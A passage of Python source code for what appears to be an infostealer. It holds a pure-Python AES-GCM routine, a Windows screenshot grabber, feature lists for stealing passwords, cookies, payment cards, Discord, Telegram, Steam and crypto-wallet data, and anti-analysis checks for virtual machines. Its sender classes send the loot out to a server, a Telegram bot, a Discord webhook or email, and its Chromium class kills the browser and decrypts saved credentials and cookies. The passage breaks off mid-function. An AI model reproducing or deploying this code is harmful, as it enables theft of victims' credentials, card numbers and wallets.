        ("th32ModuleID", DWORD),
        ("cntThreads", DWORD),
        ("th32ParentProcessID", DWORD),
        ("pcPriClassBase", LONG),
        ("dwFlags", DWORD),
        ("szExeFile", CHAR * MAX_PATH)
    ]


class ProcessMemoryCountersEx(Structure):
    _fields_ = [
        ("cb", c_ulong),
        ("PageFaultCount", c_ulong),
        ("PeakWorkingSetSize", c_size_t),
        ("WorkingSetSize", c_size_t),
        ("QuotaPeakPagedPoolUsage", c_size_t),
        ("QuotaPagedPoolUsage", c_size_t),
        ("QuotaPeakNonPagedPoolUsage", c_size_t),
        ("QuotaNonPagedPoolUsage", c_size_t),
        ("PagefileUsage", c_size_t),
        ("PeakPagefileUsage", c_size_t),
        ("PrivateUsage", c_size_t)
    ]


class DisplayDevice(Structure):
    _fields_ = [
        ("cb", c_ulong),
        ("DeviceName", c_wchar * 32),
        ("DeviceString", c_wchar * 128),
        ("StateFlags", c_ulong),
        ("DeviceID", c_wchar * 128),
        ("DeviceKey", c_wchar * 128)
    ]


class MemoryStatusEx(Structure):
    _fields_ = [
        ('dwLength', c_uint32),
        ('dwMemoryLoad', c_uint32),
        ('ullTotalPhys', c_ulonglong),
        ('ullAvailPhys', c_ulonglong),
        ('ullTotalPageFile', c_ulonglong),
        ('ullAvailPageFile', c_ulonglong),
        ('ullTotalVirtual', c_ulonglong),
        ('ullAvailVirtual', c_ulonglong),
        ('sullAvailExtendedVirtual', c_ulonglong)
    ]


class UlargeInteger(Structure):
    _fields_ = [
        ("LowPart", c_ulong),
        ("HighPart", c_ulong)
    ]


class BitmapInfoHeader(Structure):
    _fields_ = [
        ("biSize", DWORD),
        ("biWidth", LONG),
        ("biHeight", LONG),
        ("biPlanes", WORD),
        ("biBitCount", WORD),
        ("biCompression", DWORD),
        ("biSizeImage", DWORD),
        ("biXPelsPerMeter", LONG),
        ("biYPelsPerMeter", LONG),
        ("biClrUsed", DWORD),
        ("biClrImportant", DWORD)
    ]


class BitmapInfo(Structure):
    _fields_ = [
        ("bmiHeader", BitmapInfoHeader),
        ("bmiColors", DWORD * 3)
    ]
# ********** Cipher **********
def _compact_word(word):
    return (word[0] << 24) | (word[1] << 16) | (word[2] << 8) | word[3]


def _string_to_bytes(text):
    return list(ord(c) for c in text)


def _bytes_to_string(binary):
    return "".join(chr(b) for b in binary)


def _concat_list(a, b):
    return a + b


try:
    xrange
except Exception:
    xrange = range


    def _string_to_bytes(text):
        if isinstance(text, bytes):
            return text
        return [ord(c) for c in text]


    def _bytes_to_string(binary):
        return bytes(binary)


    def _concat_list(a, b):
        return a + bytes(b)

class Counter(object):

    def __init__(self, initial_value=1):

        self._counter = [((initial_value >> i) % 256) for i in xrange(128 - 8, -1, -8)]

    value = property(lambda s: s._counter)

    def increment(self):

        for i in xrange(len(self._counter) - 1, -1, -1):
            self._counter[i] += 1

            if self._counter[i] < 256: break

            # Carry the one
            self._counter[i] = 0

        # Overflow
        else:
            self._counter = [0] * len(self._counter)


class AESBlockModeOfOperation(object):

    def __init__(self, key):
        self._aes = AES(key)

    def decrypt(self, ciphertext):
        raise Exception('not implemented')

    def encrypt(self, plaintext):
        raise Exception('not implemented')

class AESStreamModeOfOperation(AESBlockModeOfOperation):
    ...


class AESSegmentModeOfOperation(AESStreamModeOfOperation):

    segment_bytes = 16


class AESModeOfOperationCTR(AESStreamModeOfOperation):

    name = "Counter (CTR)"

    def __init__(self, key, counter=None):
        AESBlockModeOfOperation.__init__(self, key)

        if counter is None:
            counter = Counter()

        self._counter = counter
        self._remaining_counter = []

    def encrypt(self, plaintext):
        while len(self._remaining_counter) < len(plaintext):
            self._remaining_counter += self._aes.encrypt(self._counter.value)
            self._counter.increment()

        plaintext = _string_to_bytes(plaintext)

        encrypted = [(p ^ c) for (p, c) in zip(plaintext, self._remaining_counter)]
        self._remaining_counter = self._remaining_counter[len(encrypted):]

        return _bytes_to_string(encrypted)

    def decrypt(self, crypttext):
        return self.encrypt(crypttext)


class AESModeOfOperationGCM(AESModeOfOperationCTR):
    name = "GCM"

    def __init__(self, key, iv):
        iv = iv + b"\x00\x00\x00\x02"
        iv_int = 0
        for i in xrange(0, len(iv), 4):
            iv_int = (iv_int << 32) + struct.unpack('>I', iv[i:i + 4])[0]
        AESModeOfOperationCTR.__init__(self, key, counter=Counter(iv_int))


AESModesOfOperation = dict(
    ctr=AESModeOfOperationCTR,
    gcm=AESModeOfOperationGCM,
)
PADDING_NONE = 'none'
PADDING_DEFAULT = 'default'
def _block_can_consume(self, size):
    if size >= 16: return 16
    return 0


def _block_final_encrypt(self, data, padding=PADDING_DEFAULT):
    if padding == PADDING_DEFAULT:
        data = append_PKCS7_padding(data)

    elif padding == PADDING_NONE:
        if len(data) != 16:
            raise Exception('invalid data length for final block')
    else:
        raise Exception('invalid padding option')

    if len(data) == 32:
        return self.encrypt(data[:16]) + self.encrypt(data[16:])

    return self.encrypt(data)


def _block_final_decrypt(self, data, padding=PADDING_DEFAULT):
    if padding == PADDING_DEFAULT:
        return strip_PKCS7_padding(self.decrypt(data))

    if padding == PADDING_NONE:
        if len(data) != 16:
            raise Exception('invalid data length for final block')
        return self.decrypt(data)

    raise Exception('invalid padding option')

AESBlockModeOfOperation._can_consume = _block_can_consume
AESBlockModeOfOperation._final_encrypt = _block_final_encrypt
AESBlockModeOfOperation._final_decrypt = _block_final_decrypt


def _segment_can_consume(self, size):
    return self.segment_bytes * int(size // self.segment_bytes)


def _segment_final_encrypt(self, data, padding=PADDING_DEFAULT):
    if padding != PADDING_DEFAULT:
        raise Exception('invalid padding option')

    faux_padding = (chr(0) * (self.segment_bytes - (len(data) % self.segment_bytes)))
    padded = data + to_bufferable(faux_padding)
    return self.encrypt(padded)[:len(data)]


def _segment_final_decrypt(self, data, padding=PADDING_DEFAULT):
    if padding != PADDING_DEFAULT:
        raise Exception('invalid padding option')

    faux_padding = (chr(0) * (self.segment_bytes - (len(data) % self.segment_bytes)))
    padded = data + to_bufferable(faux_padding)
    return self.decrypt(padded)[:len(data)]


AESSegmentModeOfOperation._can_consume = _segment_can_consume
AESSegmentModeOfOperation._final_encrypt = _segment_final_encrypt
AESSegmentModeOfOperation._final_decrypt = _segment_final_decrypt


def _stream_can_consume(self, size):
    return size


def _stream_final_encrypt(self, data, padding=PADDING_DEFAULT):
    if padding not in [PADDING_NONE, PADDING_DEFAULT]:
        raise Exception('invalid padding option')

    return self.encrypt(data)


def _stream_final_decrypt(self, data, padding=PADDING_DEFAULT):
    if padding not in [PADDING_NONE, PADDING_DEFAULT]:
        raise Exception('invalid padding option')

    return self.decrypt(data)


AESStreamModeOfOperation._can_consume = _stream_can_consume
AESStreamModeOfOperation._final_encrypt = _stream_final_encrypt
AESStreamModeOfOperation._final_decrypt = _stream_final_decrypt

class BlockFeeder(object):

    def __init__(self, mode, feed, final, padding=PADDING_DEFAULT):
        self._mode = mode
        self._feed = feed
        self._final = final
        self._buffer = to_bufferable("")
        self._padding = padding

    def feed(self, data=None):

        if self._buffer is None:
            raise ValueError('already finished feeder')

        # Finalize; process the spare bytes we were keeping
        if data is None:
            result = self._final(self._buffer, self._padding)
            self._buffer = None
            return result

        self._buffer += to_bufferable(data)

        result = to_bufferable('')
        while len(self._buffer) > 16:
            can_consume = self._mode._can_consume(len(self._buffer) - 16)
            if can_consume == 0: break
            result += self._feed(self._buffer[:can_consume])
            self._buffer = self._buffer[can_consume:]

        return result
class Encrypter(BlockFeeder):

    def __init__(self, mode, padding=PADDING_DEFAULT):
        BlockFeeder.__init__(self, mode, mode.encrypt, mode._final_encrypt, padding)


class Decrypter(BlockFeeder):

    def __init__(self, mode, padding=PADDING_DEFAULT):
        BlockFeeder.__init__(self, mode, mode.decrypt, mode._final_decrypt, padding)


BLOCK_SIZE = (1 << 13)


def _feed_stream(feeder, in_stream, out_stream, block_size=BLOCK_SIZE):

    while True:
        chunk = in_stream.read(block_size)
        if not chunk:
            break
        converted = feeder.feed(chunk)
        out_stream.write(converted)
    converted = feeder.feed()
    out_stream.write(converted)


def encrypt_stream(mode, in_stream, out_stream, block_size=BLOCK_SIZE, padding=PADDING_DEFAULT):

    encrypter = Encrypter(mode, padding=padding)
    _feed_stream(encrypter, in_stream, out_stream, block_size)


def decrypt_stream(mode, in_stream, out_stream, block_size=BLOCK_SIZE, padding=PADDING_DEFAULT):

    decrypter = Decrypter(mode, padding=padding)
    _feed_stream(decrypter, in_stream, out_stream, block_size)
def to_bufferable(binary):
    return binary


def _get_byte(c):
    return ord(c)


try:
    xrange
except:

    def to_bufferable(binary):
        if isinstance(binary, bytes):
            return binary
        return bytes(ord(b) for b in binary)


    def _get_byte(c):
        return c


def append_PKCS7_padding(data):
    pad = 16 - (len(data) % 16)
    return data + to_bufferable(chr(pad) * pad)


def strip_PKCS7_padding(data):
    if len(data) % 16 != 0:
        raise ValueError("invalid length")

    pad = _get_byte(data[-1])

    if pad > 16:
        raise ValueError("invalid padding byte")

    return data[:-pad]

class Screen:

    Monitor = Dict[str, int]
    Size = namedtuple("Size", "width, height")
    Position = namedtuple("Position", "left, top")

    def __init__(self, data: bytearray, monitor: Monitor, size: Optional[Size] = None):

        self.__pixels = None
        self.__rgb = None
        self.raw = data
        self.position = Screen.Position(monitor["left"], monitor["top"])
        self.size = Screen.Size(monitor["width"], monitor["height"]) if size is None else size

    @property
    def __array_interface__(self) -> Dict[str, Any]:

        return {
            "version": 3,
            "shape": (self.height, self.width, 4),
            "typestr": "|u1",
            "data": self.raw,
        }

    @classmethod
    def from_size(cls: Type["ScreenShot"], data: bytearray, width: int, height: int):

        monitor = {"left": 0, "top": 0, "width": width, "height": height}
        return cls(data, monitor)

    @property
    def rgb(self):

        if not self.__rgb:

            rgb = bytearray(self.height * self.width * 3)
            raw = self.raw
            rgb[::3] = raw[2::4]
            rgb[1::3] = raw[1::4]
            rgb[2::3] = raw[::4]
            self.__rgb = bytes(rgb)

        return self.__rgb

    @property
    def bgra(self):
        return bytes(self.raw)

    @property
    def height(self):
        return self.size.height

    @property
    def width(self):
        return self.size.width

    @property
    def left(self):
        return self.position.left

    @property
    def top(self):
        return self.position.top

    @property
    def pixels(self):

        if not self.__pixels:

            rgb = zip(self.raw[2::4], self.raw[1::4], self.raw[::4])
            self.__pixels = list(zip(*[iter(rgb)] * self.width))

        return self.__pixels

    def pixel(self, x: int, y: int):

        try:
            return self.pixels[y][x]
        except:
            print(f"Pixel location ({x}, {y}) is out of range.")
CAPTUREBLT = 0x40000000
DIB_RGB_COLORS = 0
SRCCOPY = 0x00CC0020
MONITORNUMPROC = WINFUNCTYPE(INT, DWORD, DWORD, POINTER(RECT), DOUBLE)
CFUNCTIONS = {
    "BitBlt": ("gdi32", [HDC, INT, INT, INT, INT, HDC, INT, INT, DWORD], BOOL),
    "CreateCompatibleBitmap": ("gdi32", [HDC, INT, INT], HBITMAP),
    "CreateCompatibleDC": ("gdi32", [HDC], HDC),
    "DeleteObject": ("gdi32", [HGDIOBJ], INT),
    "EnumDisplayMonitors": ("user32", [HDC, c_void_p, MONITORNUMPROC, LPARAM], BOOL),
    "GetDeviceCaps": ("gdi32", [HWND, INT], INT),
    "GetDIBits": ("gdi32", [HDC, HBITMAP, UINT, UINT, c_void_p, POINTER(BitmapInfo), UINT], BOOL),
    "GetSystemMetrics": ("user32", [INT], INT),
    "GetWindowDC": ("user32", [HWND], HDC),
    "SelectObject": ("gdi32", [HDC, HGDIOBJ], HGDIOBJ),
}

lock = Lock()

class Screencapture:

    bmp = None
    memdc = None
    Monitor = Dict[str, int]

    _srcdc_dict = {}

    def __init__(self, **_: Any):

        self.cls_image = Screen
        self.compression_level = 6
        self.with_cursor = False
        self._monitors = []

        self.user32 = WinDLL("user32")
        self.gdi32 = WinDLL("gdi32")
        self._set_cfunctions()
        self._set_dpi_awareness()

        self._bbox = {"height": 0, "width": 0}
        self._data: Array[c_char] = create_string_buffer(0)

        srcdc = self._get_srcdc()

        if not Screencapture.memdc:
            Screencapture.memdc = self.gdi32.CreateCompatibleDC(srcdc)

        bmi = BitmapInfo()
        bmi.bmiHeader.biSize = sizeof(BitmapInfoHeader)
        bmi.bmiHeader.biPlanes = 1
        bmi.bmiHeader.biBitCount = 32
        bmi.bmiHeader.biCompression = 0
        bmi.bmiHeader.biClrUsed = 0
        bmi.bmiHeader.biClrImportant = 0

        self._bmi = bmi

    @property
    def monitors(self):

        if not self._monitors:
            with lock:
                self._monitors_impl()

        return self._monitors

    @staticmethod
    def _merge(screenshot: Screen, cursor: Screen):

        (cx, cy), (cw, ch) = cursor.position, cursor.size
        (x, y), (w, h) = screenshot.position, screenshot.size

        cx2, cy2 = cx + cw, cy + ch
        x2, y2 = x + w, y + h

        overlap = cx < x2 and cx2 > x and cy < y2 and cy2 > y

        if not overlap:
            return screenshot

        screen_data = screenshot.raw
        cursor_data = cursor.raw

        cy, cy2 = (cy - y) * 4, (cy2 - y2) * 4
        cx, cx2 = (cx - x) * 4, (cx2 - x2) * 4
        start_count_y = -cy if cy < 0 else 0
        start_count_x = -cx if cx < 0 else 0
        stop_count_y = ch * 4 - max(cy2, 0)
        stop_count_x = cw * 4 - max(cx2, 0)
        rgb = range(3)

        for count_y in range(start_count_y, stop_count_y, 4):
            pos_s = (count_y + cy) * w + cx
            pos_c = count_y * cw

            for count_x in range(start_count_x, stop_count_x, 4):
                spos = pos_s + count_x
                cpos = pos_c + count_x
                alpha = cursor_data[cpos + 3]

                if not alpha:
                    continue

                if alpha == 255:
                    screen_data[spos:spos + 3] = cursor_data[cpos: cpos + 3]

                else:
                    alpha = alpha / 255
                    for item in rgb:
                        screen_data[spos + item] = int(cursor_data[cpos + item] * alpha + screen_data[spos + item] * (1 - alpha))

        return screenshot

    @staticmethod
    def _cfactory(attr: Any, func: str, argtypes: List[Any], restype: Any, errcheck: Optional[Callable] = None):

        meth = getattr(attr, func)
        meth.argtypes = argtypes
        meth.restype = restype

        if errcheck:
            meth.errcheck = errcheck

    def _set_cfunctions(self) -> None:

        cfactory = self._cfactory
        attrs = {
            "gdi32": self.gdi32,
            "user32": self.user32,
        }

        for func, (attr, argtypes, restype) in CFUNCTIONS.items():
            cfactory(
                attr=attrs[attr],
                func=func,
                argtypes=argtypes,
                restype=restype,
            )

    def _set_dpi_awareness(self) -> None:

        version = getwindowsversion()[:2]

        if version >= (6, 3):
            windll.shcore.SetProcessDpiAwareness(2)

        elif (6, 0) <= version < (6, 3):
            self.user32.SetProcessDPIAware()

    def _get_srcdc(self) -> int:

        current_thread_index = current_thread()
        current_srcdc = Screencapture._srcdc_dict.get(current_thread_index) or Screencapture._srcdc_dict.get(main_thread())

        if current_srcdc:
            srcdc = current_srcdc

        else:
            srcdc = self.user32.GetWindowDC(0)
            Screencapture._srcdc_dict[current_thread_index] = srcdc

        return srcdc

    def _monitors_impl(self) -> None:

        int_ = int
        user32 = self.user32
        get_system_metrics = user32.GetSystemMetrics

        self._monitors.append(
            {
                "left": int_(get_system_metrics(76)),
                "top": int_(get_system_metrics(77)),
                "width": int_(get_system_metrics(78)),
                "height": int_(get_system_metrics(79)),
            }
        )

        def _callback(monitor: int, data: HDC, rect: LPRECT, dc_: LPARAM) -> int:

            rct = rect.contents
            self._monitors.append(
                {
                    "left": int_(rct.left),
                    "top": int_(rct.top),
                    "width": int_(rct.right) - int_(rct.left),
                    "height": int_(rct.bottom) - int_(rct.top),
                }
            )

            return 1

        callback = MONITORNUMPROC(_callback)
        user32.EnumDisplayMonitors(0, 0, callback, 0)

    def _grab_impl(self, monitor: Monitor) -> Screen:

        srcdc, memdc = self._get_srcdc(), Screencapture.memdc
        width, height = monitor["width"], monitor["height"]

        if (self._bbox["height"], self._bbox["width"]) != (height, width):

            self._bbox = monitor
            self._bmi.bmiHeader.biWidth = width
            self._bmi.bmiHeader.biHeight = -height
            self._data = create_string_buffer(width * height * 4)

            if Screencapture.bmp:
                self.gdi32.DeleteObject(Screencapture.bmp)

            Screencapture.bmp = self.gdi32.CreateCompatibleBitmap(srcdc, width, height)
            self.gdi32.SelectObject(memdc, Screencapture.bmp)

        self.gdi32.BitBlt(memdc, 0, 0, width, height, srcdc, monitor["left"], monitor["top"], SRCCOPY | CAPTUREBLT)
        bits = self.gdi32.GetDIBits(memdc, Screencapture.bmp, 0, height, self._data, self._bmi, DIB_RGB_COLORS)

        if bits != height:
            print("gdi32.GetDIBits() failed.")

        return self.cls_image(bytearray(self._data), monitor)

    def _cursor_impl(self) -> Optional[Screen]:
        return None

    def grab(self, monitor: Union[Monitor, Tuple[int, int, int, int]]):

        if isinstance(monitor, tuple):
            monitor = {
                "left": monitor[0],
                "top": monitor[1],
                "width": monitor[2] - monitor[0],
                "height": monitor[3] - monitor[1],
            }

        with lock:

            screenshot = self._grab_impl(monitor)
            if self.with_cursor:

                cursor = self._cursor_impl()
                screenshot = self._merge(screenshot, cursor)

            return screenshot

    def save_in_memory(self):

        monitors = [dict(monitor) for monitor in set(tuple(monitor.items()) for monitor in self.monitors)]

        for index, display in enumerate(monitors):
            sct = self.grab(display)
            output = self.create_png(sct.rgb, sct.size, level=self.compression_level, output=None)

            yield output

    def create_in_memory(self, **kwargs: Any):

        kwargs["monitor"] = kwargs.get("monitor", 1)
        return [image for image in self.save_in_memory()]

    @staticmethod
    def create_png(data: bytes, size: Tuple[int, int], level: int = 6, output: Optional[str] = None):

        width, height = size
        line = width * 3
        png_filter = pack(">B", 0)
        scanlines = b"".join([png_filter + data[y * line:y * line + line] for y in range(height)])
        magic = pack(">8B", 137, 80, 78, 71, 13, 10, 26, 10)

        ihdr = [b"", b"IHDR", b"", b""]
        ihdr[2] = pack(">2I5B", width, height, 8, 2, 0, 0, 0)
        ihdr[3] = pack(">I", crc32(b"".join(ihdr[1:3])) & 0xFFFFFFFF)
        ihdr[0] = pack(">I", len(ihdr[2]))

        idat = [b"", b"IDAT", compress(scanlines, level), b""]
        idat[3] = pack(">I", crc32(b"".join(idat[1:3])) & 0xFFFFFFFF)
        idat[0] = pack(">I", len(idat[2]))

        iend = [b"", b"IEND", b"", b""]
        iend[3] = pack(">I", crc32(iend[1]) & 0xFFFFFFFF)
        iend[0] = pack(">I", len(iend[2]))

        if not output:
            return magic + b"".join(ihdr + idat + iend)

        with open(output, "wb") as fileh:
            fileh.write(magic)
            fileh.write(b"".join(ihdr))
            fileh.write(b"".join(idat))
            fileh.write(b"".join(iend))

            fileh.flush()
            fsync(fileh.fileno())

        return None
#***** enum ******
class Features(Enum):
    passwords = "Passwords"
    cookies = "Cookies"
    cards = "Cards"
    history = "History"
    bookmarks = "Bookmarks"
    extensions = "Extensions"
    processes = "Processes"
    system = "System"
    screenshot = "Screenshot"
    discord = "Discord"
    telegram = "Telegram"
    filezilla = "Filezilla"
    wallets = "Wallets"
    steam = "Steam"
    all = "All"
class Protectors(Enum):
    processes = "Processes"
    mac_address = "Mac address"
    computer = "Computer"
    user = "User"
    hosting = "Hosting"
    http_simulation = "HTTP simulation"
    virtual_machine = "Virtual machine"
    disable = "Disable"
    all = "All"
class Senders:

    @staticmethod
    def server(server: str) -> Server:
        """
        Creates a sender for the server.

        Parameters:
        - server [str]: A link to the rooted server that accepts the file as input.

        Returns:
        - Server: Server sender object.
        """
        return Server(server=server)

    @staticmethod
    def telegram(token: str, user_id: int) -> sTelegram:
        """
        Creates a sender for the Telegram.

        Parameters:
        - token [str]: The token of the bot that will send the archive.
        - user_id [int]: ID of the user or chat room where the bot will send the archive to.

        Returns:
        - Telegram: Telegram sender object.
        """
        return sTelegram(token=token, user_id=user_id)

    @staticmethod
    def discord(webhook: str) -> sDiscord:
        """
        Creates a sender for the Discord.

        Parameters:
        - webhook [str]: Hook of the Discord bot.

        Returns:
        - Discord: Discord sender object.
        """
        return sDiscord(webhook=webhook)

    @staticmethod
    def smtp(sender_email: str, sender_password: str, recipient_email: str, smtp_server: str = "smtp.gmail.com", smtp_port: int = 587) -> Smtp:
        """
        Creates a sender for the Email.

        Parameters:
        - sender_email [str]: Sender's email.
        - sender_password [str]: Sender's password.
        - recipient_email [str]: Recipient's email.
        - smtp_server [str]: Smtp server.
        - smtp_port [int]: Smtp port.

        Returns:
        - Smtp: Smtp sender object.
        """
        return Smtp(
            sender_email=sender_email,
            sender_password=sender_password,
            recipient_email=recipient_email,
            smtp_server=smtp_server,
            smtp_port=smtp_port
        )
class Utils(Enum):
    autostart = "Autostart"
    message = "Message"
    all = "All"
class Chromium:
    """
    Collects data from the browser.
    """
    def __init__(self, browser_name: str, browser_path: str, process_name: str, statuses: List):

        self.__browser_name = browser_name
        self.__state_path = path.join(browser_path, "Local State")
        self.__browser_path = browser_path
        self.__process_name = process_name
        self.__statuses = statuses
        self.__profiles = None

        self.__storage = MemoryStorage()
        self.__config = ChromiumConfig()
        self.__path = path.join("Browsers", self.__browser_name)

    def _kill_process(self):
        """
        Kills browser process.

        Parameters:
        - None.

        Returns:
        - None.
        """
        run(
            f"taskkill /f /im {self.__process_name}",
            shell=True,
            creationflags=CREATE_NEW_CONSOLE | SW_HIDE
        )

    def _get_profiles(self) -> List:
        """
        Collects all browser profiles.

        Parameters:
        - None.

        Returns:
        - list: List of all browser profiles.
        """
        pattern = compile(r"Default|Profile \d+")
        profiles = sum([pattern.findall(dir_path) for dir_path in listdir(self.__browser_path)], [])
        profile_paths = [path.join(self.__browser_path, profile) for profile in profiles]

        if profile_paths:
            return profile_paths

        return [self.__browser_path]

    def _check_paths(self) -> None:
        """
        Checks if a browser is installed and if data collection from it is enabled.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if path.exists(self.__browser_path) and any(self.__statuses):
            self.__profiles = self._get_profiles()

    @staticmethod
    def _crypt_unprotect_data(encrypted_bytes: b64decode, entropy: bytes = b'') -> bytes:
        """
        Decrypts data previously encrypted using Windows CryptProtectData function.

        Parameters:
        - encrypted_bytes [b64decode]: The encrypted data to be decrypted.
        - entropy [bytes]: Optional entropy to provide additional security during decryption.

        Returns:
        - bytes: Decrypted data as bytes.
        """
        blob = DataBlob()

        if windll.crypt32.CryptUnprotectData(byref(DataBlob(len(encrypted_bytes), c_buffer(encrypted_bytes, len(encrypted_bytes)))), None, byref(DataBlob(len(entropy), c_buffer(entropy, len(entropy)))), None, None, 0x01, byref(blob)):

            buffer = c_buffer(int(blob.cbData))
            cdll.msvcrt.memcpy(buffer, blob.pbData, int(blob.cbData))
            windll.kernel32.LocalFree(blob.pbData)

            return buffer.raw

    def _get_key(self) -> bytes:
        """
        Receives the decryption key.

        Parameters:
        - None.

        Returns:
        - bytes: Decryption key.
        """
        with open(self.__state_path, "r", encoding="utf-8") as state:
            file = state.read()

        state.close()

        return self._crypt_unprotect_data(b64decode(loads(file)["os_crypt"]["encrypted_key"])[5:])

    @staticmethod
    def _get_datetime(date: int) -> str:
        """
        Converts timestamp to date.

        Parameters:
        - date [int]: Date to be converted.

        Returns:
        - str: Converted date or error message.
        """
        try:
            return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
        except:
            return "Can't decode"

    @staticmethod
    def _decrypt(value: bytes, master_key: bytes) -> str:
        """
        Decrypts the value with the master key.

        Parameters:
        - value [bytes]: The value to be decrypted.
        - master_key [bytes]: Decryption key.

        Returns:
        - str: Decrypted string.
        """
        try:
            return AESModeOfOperationGCM(master_key, value[3:15]).decrypt(value[15:])[:-16].decode()
        except:
            return "Can't decode"
    @staticmethod
    def _get_db_connection(database: str) -> Tuple[Cursor, Connection]:
        """
        Creates a connection with the database.

        Parameters:
        - database [str]: Path to database.

        Returns:
        - tuple: Cursor and Connection objects.
        """
        connection = connect(
            f"file:{database}?mode=ro&immutable=1",
            uri=True,
            isolation_level=None,
            check_same_thread=False
        )
        cursor = connection.cursor()

        return cursor, connection

    @staticmethod
    def _get_file(file_path: str) -> str:
        """
        Reads the file contents.

        Parameters:
        - file_path [str]: Path to file.

        Returns:
        - str: File content.
        """
        with open(file_path, "r", encoding="utf-8") as file:
            data = file.read()

        return data

    def _grab_passwords(self, profile: str, file_path: str) -> None:
        """
        Collects browser passwords.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        if not path.exists(file_path):
            print(f"[{self.__browser_name}]: No passwords file found")
            return

        cursor, connection = self._get_db_connection(file_path)
        passwords_list = cursor.execute(self.__config.PasswordsSQL).fetchall()

        cursor.close()
        connection.close()

        if not passwords_list:
            print(f"[{self.__browser_name}]: No passwords found")
            return

        data = self.__config.PasswordsData
        temp = set([
            data.format(result[0], result[1], self._decrypt(result[2], self.__master_key))
            for result in passwords_list
        ])

        self.__storage.add_from_memory(
            path.join(self.__path, rf"{profile} Passwords.txt"),
            "".join(item for item in temp)
        )

        self.__storage.add_data("Passwords", len(temp))

    def _grab_cookies(self, profile: str, file_path: str) -> None:
        """
        Collects browser cookies.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        if not path.exists(file_path):
            print(f"[{self.__browser_name}]: No cookies file found")
            return

        cursor, connection = self._get_db_connection(file_path)
        cookies_list = cursor.execute(self.__config.CookiesSQL).fetchall()

        cursor.close()
        connection.close()

        if not cookies_list:
            print(f"[{self.__browser_name}]: No cookies found")
            return

        cookies_list_filtered = [row for row in cookies_list if row[0] != ""]

        data = self.__config.CookiesData
        temp = [
            data.format(row[0], row[1], self._decrypt(row[2], self.__master_key))
            for row in cookies_list_filtered
        ]

        self.__storage.add_from_memory(
            path.join(self.__path, rf"{profile} Cookies.txt"),
            "\n".join(row for row in temp)
        )

        self.__storage.add_data("Cookies", len(temp))

    def _grab_cards(self, profile: str, file_path: str) -> None:
        """
        Collects browser cards.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        if not path.exists(file_path):
            print(f"[{self.__browser_name}]: No cards file found")
            return

        cursor, connection = self._get_db_connection(file_path)
        cards_list = cursor.execute(self.__config.CardsSQL).fetchall()

        cursor.close()
        connection.close()

        if not cards_list:
            print(f"[{self.__browser_name}]: No cards found")
            return

        data = self.__config.CardsData
        temp = set([
            data.format(result[0], self._decrypt(result[3], self.__master_key), result[1], result[2])
            for result in cards_list
        ])

        self.__storage.add_from_memory(
            path.join(self.__path, rf"{profile} Cards.txt"),
            "".join(item for item in temp)
        )

        self.__storage.add_data("Cards", len(temp))
    def _grab_history(self, profile: str, file_path: str) -> None:
        """
        Collects browser history.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        if not path.exists(file_path):
            print(f"[{self.__browser_name}]: No history file found")
            return

        cursor, connection = self._get_db_connection(file_path)
        results = cursor.execute(self.__config.HistorySQL).fetchall()
        history_list = [cursor.execute(self.__config.HistoryLinksSQL % int(item[0])).fetchone() for item in results]

        cursor.close()
        connection.close()

        if not results:
            print(f"[{self.__browser_name}]: No history found")
            return

        data = self.__config.HistoryData
        temp = set([
            data.format(result[0], result[1], self._get_datetime(result[2]))
            for result in history_list
        ])

        self.__storage.add_from_memory(
            path.join(self.__path, rf"{profile} History.txt"),
            "".join(item for item in temp)
        )

        self.__storage.add_data("History", len(temp))

    def _grab_bookmarks(self, profile: str, file_path: str) -> None:
        """
        Collects browser bookmarks.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        if not path.exists(file_path):
            print(f"[{self.__browser_name}]: No bookmarks file found")
            return

        file = self._get_file(file_path)
        bookmarks_list = sum([self.__config.BookmarksRegex.findall(item) for item in file.split("{")], [])

        if not bookmarks_list:
            print(f"[{self.__browser_name}]: No bookmarks found")
            return

        data = self.__config.BookmarksData
        temp = set([
            data.format(result[0], result[1])
            for result in bookmarks_list
        ])

        self.__storage.add_from_memory(
            path.join(self.__path, rf"{profile} Bookmarks.txt"),
            "".join(item for item in temp)
        )

        self.__storage.add_data("Bookmarks", len(temp))

    def _grab_extensions(self, profile: str, extensions_path: str) -> None:
        """
        Collects browser extensions.

        Parameters:
        - profile [str]: Browser profile.
        - extensions_path [str]: Path to extensions directory.

        Returns:
        - None.
        """
        if not path.exists(extensions_path):
            print(f"[{self.__browser_name}]: No extensions folder found")
            return

        extensions_list = []
        extensions_dirs = listdir(extensions_path)

        if not extensions_dirs:
            print(f"[{self.__browser_name}]: No extensions found")
            return

        for dirpath in extensions_dirs:

            extension_dir = listdir(path.join(extensions_path, dirpath))

            if len(extension_dir) == 0:
                continue

            extension_dir = extension_dir[-1]
            manifest_path = path.join(extensions_path, dirpath, extension_dir, "manifest.json")

            with open(manifest_path, "r", encoding="utf-8") as file:
                manifest = load(file)
                name = manifest.get("name")

                if name:
                    extensions_list.append(name)

            file.close()

        extensions_set = set(extensions_list)

        self.__storage.add_from_memory(
            path.join(self.__path, rf"{profile} Extensions.txt"),
            "\n".join(item for item in extensions_set)
        )

        self.__storage.add_data("Extensions", len(extensions_set))
    def _grab_wallets(self, profile: str, wallets: str) -> None:
        """
        Collects browser wallets.

        Parameters:
        - profile [str]: Browser profile.
        - wallets [str]: Path to wallets directory.

        Returns:
        - None.
        """
        if not path.exists(wallets):
            print(f"[{self.__browser_name}]: No wallets found")
            return

        for wallet in self.__config.WalletLogs:
            for extension in wallet["folders"]:

                try:

                    extension_path = path.join(wallets, extension)

                    if not path.exists(extension_path):
                        continue

                    self.__storage.add_from_disk(
                        extension_path,
                        path.join("Wallets", rf'{self.__browser_name} {profile} {wallet["name"]}')
                    )

                    self.__storage.add_data("Wallets", wallet["name"])

                except Exception as e:
